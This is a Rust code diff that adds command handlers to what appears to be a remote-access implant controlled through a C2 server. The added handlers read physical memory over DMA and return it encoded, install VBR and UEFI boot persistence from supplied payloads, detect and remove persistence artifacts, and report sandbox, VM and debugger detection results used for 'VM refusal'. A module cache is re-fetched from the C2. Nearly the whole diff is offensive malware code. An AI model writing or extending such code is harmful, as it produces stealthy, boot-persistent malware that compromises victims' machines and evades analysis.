+        #[cfg(not(feature = "hardware-persistence"))]
+        Command::HwPrepareDmaPayload { .. } => {
+            Err("hardware-persistence feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "hardware-persistence")]
+        Command::HwDmaReadPhysical { addr, size } => {
+            crate::hardware_persistence::dma_read_physical(addr, size as usize)
+                .map(|data| {
+                    use base64::Engine;
+                    serde_json::json!({
+                        "data": base64::engine::general_purpose::STANDARD.encode(&data),
+                        "address": addr,
+                        "size": data.len(),
+                    }).to_string()
+                })
+                .map_err(|e| format!("DMA physical memory read failed: {e:#}"))
+        }
+        #[cfg(not(feature = "hardware-persistence"))]
+        Command::HwDmaReadPhysical { .. } => {
+            Err("hardware-persistence feature not enabled".to_string())
+        }
+
+        // ── Hardware Persistence: Boot ────────────────────────────────────
+        #[cfg(feature = "hardware-persistence")]
+        Command::HwBootMode => {
+            crate::hardware_persistence::check_bios_uefi_mode()
+                .map(|mode| {
+                    serde_json::json!({
+                        "mode": format!("{:?}", mode),
+                    }).to_string()
+                })
+                .map_err(|e| format!("Boot mode check failed: {e:#}"))
+        }
+        #[cfg(not(feature = "hardware-persistence"))]
+        Command::HwBootMode => {
+            Err("hardware-persistence feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "hardware-persistence")]
+        Command::HwInstallVbrPersistence { payload_path } => {
+            crate::hardware_persistence::install_vbr_persistence(&payload_path)
+                .map(|_| "VBR persistence installed successfully".to_string())
+                .map_err(|e| format!("VBR persistence installation failed: {e:#}"))
+        }
+        #[cfg(not(feature = "hardware-persistence"))]
+        Command::HwInstallVbrPersistence { .. } => {
+            Err("hardware-persistence feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "hardware-persistence")]
+        Command::HwInstallUefiBootPersistence { driver_path } => {
+            crate::hardware_persistence::install_uefi_boot_persistence(&driver_path)
+                .map(|_| "UEFI boot persistence installed successfully".to_string())
+                .map_err(|e| format!("UEFI boot persistence installation failed: {e:#}"))
+        }
+        #[cfg(not(feature = "hardware-persistence"))]
+        Command::HwInstallUefiBootPersistence { .. } => {
+            Err("hardware-persistence feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "hardware-persistence")]
+        Command::HwDetectPersistence => {
+            crate::hardware_persistence::detect_existing_persistence()
+                .map(|artifacts| {
+                    let json_artifacts: Vec<serde_json::Value> = artifacts.iter().map(|a| {
+                        serde_json::json!({
+                            "artifact_type": format!("{:?}", a.artifact_type),
+                            "description": a.description,
+                            "location": a.location,
+                            "removable": a.removable,
+                            "backup_path": a.backup_path,
+                        })
+                    }).collect();
+                    serde_json::json!({ "artifacts": json_artifacts, "count": json_artifacts.len() }).to_string()
+                })
+                .map_err(|e| format!("Persistence detection failed: {e:#}"))
+        }
+        #[cfg(not(feature = "hardware-persistence"))]
+        Command::HwDetectPersistence => {
+            Err("hardware-persistence feature not enabled".to_string())
+        }
+
+        #[cfg(feature = "hardware-persistence")]
+        Command::HwRemovePersistence {
+            artifact_type,
+            description,
+            location,
+            removable,
+        } => {
+            let artifact = crate::hardware_persistence::PersistenceArtifact {
+                artifact_type: parse_persistence_artifact_type(&artifact_type),
+                description,
+                location,
+                removable,
+                backup_path: None,
+            };
+            crate::hardware_persistence::remove_persistence(&artifact)
+                .map(|_| "Persistence artifact removed successfully".to_string())
+                .map_err(|e| format!("Persistence removal failed: {e:#}"))
+        }
+        #[cfg(not(feature = "hardware-persistence"))]
+        Command::HwRemovePersistence { .. } => {
+            Err("hardware-persistence feature not enabled".to_string())
+        }
     };
 
     // Auto-revert the impersonation token after task completion if
@@ -2433,7 +3023,89 @@ fn handle_system_info() -> Result<String, String> {
 
 fn handle_run_approved_script(name: &str) -> Result<String, String> {
     match name {
-        "health_check" => Ok("Health check OK".to_string()),
+        // ── Built-in approved scripts ───────────────────────────────────
+        //
+        // Each name maps to a deterministic, side-effect-bounded operation.
+        // No arbitrary command execution — only pre-registered routines that
+        // the operator can invoke by name via `Command::RunApprovedScript`.
+
+        "health_check" => {
+            // Basic liveness / readiness probe.  Returns a short JSON
+            // payload with hostname and uptime so the operator can
+            // distinguish multiple endpoints at a glance.
+            let uptime = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_secs();
+            let hostname = System::host_name().unwrap_or_else(|| "unknown".into());
+            Ok(serde_json::json!({
+                "status": "OK",
+                "hostname": hostname,
+                "unix_time": uptime,
+            })
+            .to_string())
+        }
+
+        "env_report" => {
+            // Run the full VM / sandbox detection pipeline and return
+            // the indicator report as JSON.  This is useful when the
+            // operator wants to audit why an endpoint did (or did not)
+            // trigger VM refusal without re-deploying.
+            let report = crate::env_check::EnvReport::collect(None);
+            Ok(serde_json::json!({
+                "vm_detected": report.vm_detected,
+                "vm_detected_strict": report.vm_detected_strict,
+                "debugger_present": report.debugger_present,
+                "sandbox_score": report.sandbox_score,
+                "ld_preload_set": report.ld_preload_set,
+                "tracer_process_found": report.tracer_process_found,
+                "timing_anomaly_detected": report.timing_anomaly_detected,
+                "yama_ptrace_scope": report.yama_ptrace_scope,
+            })
+            .to_string())
+        }
+
+        "list-modules" => {
+            // Enumerate modules currently in the cache directory.
+            let cfg = crate::config::load_config().map_err(|e| format!("config: {e}"))?;
+            let cache_dir = std::path::Path::new(&cfg.module_cache_dir);
+            if !cache_dir.exists() {
+                return Ok("[]".to_string());
+            }
+            let mut entries: Vec<String> = Vec::new();
+            let read_dir =
+                std::fs::read_dir(cache_dir).map_err(|e| format!("read_dir: {e}"))?;
+            for entry in read_dir.flatten() {
+                if let Some(name) = entry.file_name().to_str() {
+                    entries.push(name.to_owned());
+                }
+            }
+            entries.sort();
+            Ok(serde_json::json!({ "modules": entries }).to_string())
+        }
+
+        "purge-module-cache" => {
+            // Remove all cached module blobs.  This forces subsequent
+            // `DownloadModule` / `DeployModule` commands to re-fetch
+            // from the repository or C2.
+            let cfg = crate::config::load_config().map_err(|e| format!("config: {e}"))?;
+            let cache_dir = std::path::Path::new(&cfg.module_cache_dir);
+            if !cache_dir.exists() {
+                return Ok("{\"purged\": 0}".to_string());
+            }
+            let mut purged: usize = 0;
+            let read_dir =
+                std::fs::read_dir(cache_dir).map_err(|e| format!("read_dir: {e}"))?;
+            for entry in read_dir.flatten() {
+                if entry.path().is_file() {
+                    if std::fs::remove_file(entry.path()).is_ok() {
+                        purged += 1;
+                    }
+                }
+            }
+            Ok(serde_json::json!({ "purged": purged }).to_string())
+        }
+
         other => Err(format!("'{other}' is not an approved script")),
     }
 }
